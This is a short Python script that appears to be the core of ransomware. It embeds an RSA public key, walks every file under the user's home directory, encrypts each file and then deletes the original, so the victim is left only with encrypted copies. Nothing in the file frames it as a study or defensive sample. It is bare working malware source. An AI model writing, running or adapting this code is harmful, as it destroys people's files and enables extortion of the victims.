import os
from src.include.rrsa import Rsa

PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+ziLls6a9oqME2FpPNnnGfZRv
K0FISEhfwKZiHqPEAJ15isiekCIOpw5ySEezCKH2L9dQ9RQB5WYb/I7k0Iyu1YaL
VFJunH1mb1pgg4dOAifQXE9cmS9wpDeUFbItcISY98IDg8lblRIEgnCMs+URjZsw
ZQwf80I+3RSMljI/8wIDAQAB
-----END PUBLIC KEY-----
"""
HOME = os.path.expanduser('~')

encryptor = Rsa(PUBLIC_KEY)

for path, subdirs, files in os.walk(HOME):
    for file in files:
        file = os.path.join(path, file)
        # print(file)
        try:
            fp = encryptor.encrypt(file)
            if fp:
                os.remove(file)
        except PermissionError as e:
            print(e)
            continue
